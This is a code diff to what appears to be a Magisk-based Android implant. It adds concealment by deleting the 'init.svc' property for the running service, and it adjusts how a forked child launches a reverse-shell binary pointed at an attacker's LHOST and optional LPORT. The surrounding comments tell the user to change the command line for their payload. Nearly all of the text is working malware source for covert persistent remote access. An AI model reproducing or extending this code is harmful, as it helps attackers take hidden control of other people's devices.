@@ -12,6 +12,7 @@
 #include <android/log.h>
 
 #include <utils.hpp>
+#include <resetprop.hpp>
 
 
 #ifdef MAGISK_DEBUG
@@ -176,6 +177,11 @@ int main(int argc, char** argv, char** envp) {
     std::string revshell_path;
     int status;
 
+    // Hide prop:  init.svc.SVC_NAME
+    if (argc != 2) return 0;
+    std::string svc_name = "init.svc." + std::string(argv[1]);
+    delprop(svc_name.c_str());
+
     // Remount read-only /sbin on system-as-root
     // (may fail on rootfs, no problem there)
     if (access("/sbin", F_OK) == 0) {
@@ -236,9 +242,13 @@ int main(int argc, char** argv, char** envp) {
 
         if (revshell == 0) {
             // Child (revshell)
-            // TODO: Change this command line according to your payload
+            // TODO: Change this command line according to your payload if needed
+#ifdef LPORT
             char *const rs_argv[] = {(char *const) revshell_path.c_str(), (char *const) "-p", (char *const) LPORT,
                                      (char *const) LHOST, nullptr};
+#else
+            char *const rs_argv[] = {(char *const) revshell_path.c_str(), (char *const) LHOST, nullptr};
+#endif
             execve(revshell_path.c_str(), rs_argv, envp);
         } else {
             // Parent (executor)
